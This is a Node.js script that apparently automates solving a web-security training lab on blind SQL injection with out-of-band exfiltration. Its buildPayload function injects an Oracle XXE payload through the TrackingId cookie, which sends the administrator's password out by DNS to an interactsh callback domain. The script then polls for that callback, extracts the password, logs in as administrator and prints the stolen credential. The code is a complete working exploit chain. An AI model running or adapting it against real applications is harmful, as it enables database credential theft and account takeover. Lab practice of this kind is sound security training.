const { execFileSync } = require('child_process');

const { runLab, labLogin, waitForSolved } = require('./_common.cjs');
const { cookieHeader, extractLabelBeforeMarker, makeMarker, pollForInteraction, requireInteractshDomain, withCookieOverride } = require('./_oob.cjs');

const TITLE = 'Blind SQL injection with out-of-band data exfiltration';
const PATH = '/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration';

function triggerInjection(labUrl, cookies) {
  return execFileSync('curl', [
    '-ksS',
    '-m', '15',
    '-H', `Cookie: ${cookieHeader(cookies)}`,
    labUrl,
  ], {
    encoding: 'utf8',
    stdio: ['ignore', 'pipe', 'pipe'],
  });
}

function buildPayload(prefix, marker, domain) {
  return `${prefix}' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.${marker}.${domain}/"> %remote;]>'),'/l') FROM dual--`;
}

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ context, page, labUrl }) => {
    const domain = requireInteractshDomain();
    const marker = makeMarker('sqli17');

    await page.goto(labUrl, { waitUntil: 'domcontentloaded', timeout: 15000 });
    const cookies = await context.cookies(labUrl);
    const trackingId = cookies.find((cookie) => cookie.name === 'TrackingId');
    if (!trackingId) {
      throw new Error('TrackingId cookie not found');
    }

    const payload = buildPayload(trackingId.value, marker, domain);
    const attackCookies = withCookieOverride(cookies, 'TrackingId', payload);
    const since = Date.now();

    triggerInjection(labUrl, attackCookies);
    const callback = await pollForInteraction({ marker, since, timeoutMs: 60000, stepMs: 2000 });
    const password = callback ? extractLabelBeforeMarker(callback, marker, domain) : '';
    if (!callback || !password) {
      throw new Error('No administrator password was extracted from interactsh');
    }

    await labLogin(page, labUrl, 'administrator', password);
    const solved = await waitForSolved(page, labUrl, 30000, 3000);
    if (!solved) {
      throw new Error('Administrator login succeeded, but the lab never marked as solved');
    }

    console.log(`RESULT_JSON:${JSON.stringify({ marker, password, callback: callback['full-id'] || callback['q-name'] || '' })}`);
  },
});
